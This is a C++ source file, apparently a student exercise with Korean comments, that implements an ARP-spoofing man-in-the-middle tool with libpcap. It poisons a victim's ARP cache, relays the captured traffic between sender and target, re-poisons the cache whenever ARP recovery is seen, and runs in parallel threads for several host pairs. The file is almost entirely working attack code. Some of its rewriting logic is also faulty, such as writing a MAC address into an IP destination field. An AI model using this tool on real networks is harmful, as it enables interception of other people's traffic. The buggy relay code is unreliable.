

#include <thread>
#include <vector>
#include <future>

#include "AttackerInfo.h"
#include "Utill.h"


#define MAC_ADDR_LEN 6



//Attacker MAC function




int start_spoofing(char* dev ,char* sip , char* tip){

        Mac macAddress = getMacAddress(dev);
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
	if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
        }

        Ip AttackerIp = getAttackerIp(dev);
        Mac SenderMac = getSenderMac(handle, macAddress, AttackerIp ,Ip(sip));
        Mac TargetMac = getTargetMac(handle, macAddress, AttackerIp ,Ip(tip));
        
        //Sender감염 패킷생성
        EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
        //패킷 전송
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        //패킷 캡쳐
        while(1){

		const u_char* received_pkt;
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* Packet_eth;
		struct libnet_ipv4_hdr* Packet_ip;

                res = pcap_next_ex(handle, &header, &received_pkt);
                if (res == 0) continue;
                if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                        break;
                }

                Packet_eth = (struct libnet_ethernet_hdr *)(received_pkt);
                Packet_ip = (struct libnet_ipv4_hdr *)(received_pkt + sizeof(struct libnet_ethernet_hdr));

		//Sender -> Attacker -> Target
                if(Mac(Packet_eth->ether_shost)==SenderMac){
			
			printf("\n");
			printf("Before\n");	
			print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth->ether_dhost);


			u_int8_t* tmpMac =static_cast<uint8_t*>(macAddress);
			u_int8_t* tmpTmac = static_cast<uint8_t*>(TargetMac);
			memcpy(Packet_eth->ether_shost, tmpMac, MAC_ADDR_LEN);
			memcpy(Packet_eth -> ether_dhost, tmpTmac,MAC_ADDR_LEN);
			

			// Attacker IP를 네트워크 바이트 순서로 변환하여 패킷에 할당
			uint32_t attackerIpNetworkOrder = htonl(static_cast<uint32_t>(AttackerIp));
			memcpy(&Packet_ip->ip_src.s_addr, &attackerIpNetworkOrder, sizeof(uint32_t));

			// Tip IP를 네트워크 바이트 순서로 변환하여 패킷에 할당
			uint32_t tipIpNetworkOrder = htonl(static_cast<uint32_t>(Ip(tip)));
			//memcpy(&Packet_ip->ip_dst.s_addr, &tipIpNetworkOrder, sizeof(uint32_t));

			printf("\nAfter\n");
			print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth->ether_dhost);
	

                        res = pcap_sendpacket(handle, received_pkt, header->caplen);
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        else{
                                printf("\n<<Sender -> Attacker -> Target>>\n");
                        }    
                }
                //Target -> Attaceker -> Sender
                else if(Mac(Packet_eth->ether_shost)==TargetMac){


			printf("\nBefore\n");
			print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth->ether_dhost);
			u_int8_t* tmpMac = static_cast<uint8_t*>(macAddress);
			u_int8_t* tmpSenderMac = static_cast<uint8_t*>(SenderMac);

			uint32_t tmpAip = htonl(static_cast<uint32_t>(AttackerIp));
			uint32_t tmpSip = htonl(static_cast<uint32_t>(Ip(sip)));


			memcpy(&Packet_eth -> ether_shost,tmpMac,MAC_ADDR_LEN);
			memcpy(&Packet_eth -> ether_dhost,tmpSenderMac,MAC_ADDR_LEN);

			memcpy(&Packet_ip->ip_src.s_addr,&tmpAip,sizeof(uint32_t));
			memcpy(&Packet_ip->ip_dst.s_addr,&tmpSenderMac,sizeof(uint32_t));


                        res = pcap_sendpacket(handle, received_pkt,header->caplen );


			printf("\nAfter\n");
			print_info(Packet_ip,Packet_eth -> ether_shost,Packet_eth->ether_dhost);
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }else{
                                printf("\n**** Target-> Attacker -> Sender ****\n");
                        }
                        
                }

                //When ARP Table Recover
                else if(Mac(Packet_eth -> ether_dhost)==Mac::broadcastMac()){
                        //if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
                                //Sender감염 패킷생성
                                EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
                                //패킷 전송
                                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                                if (res != 0) {
                                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                                }else
				{
                                        printf("\n+Detecting Arp Recover and re-Infection+\n");
                                }
                        //}
                }
                else{
                        EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
                        sleep(1);
                        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                        if (res != 0) {
                                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        else
			{
                                printf("\n*packet transmission*\n");
                        }
                }
        }
 	pcap_close(handle);
	return 0;

}

int main(int argc, char* argv[]) {
        if (argc <=3) { //입력값이 3개 이하면 에러
                usage();
                return -1;
        }  

        char* dev = argv[1]; //네트워크 인터페이스 명

        
        std::vector<std::future<int>> spoof_threads;

        for (int i = 2; i < argc-1; i+=2) {
                std::future<int> spoof_thread = std::async(std::launch::async, start_spoofing, dev, argv[i], argv[i + 1]);
                spoof_threads.push_back(std::move(spoof_thread));
        }

        // 모든 스레드가 끝날 때까지 기다림
        for (auto& thread : spoof_threads) {
                thread.get();
        }
        
        return 0;
}
       

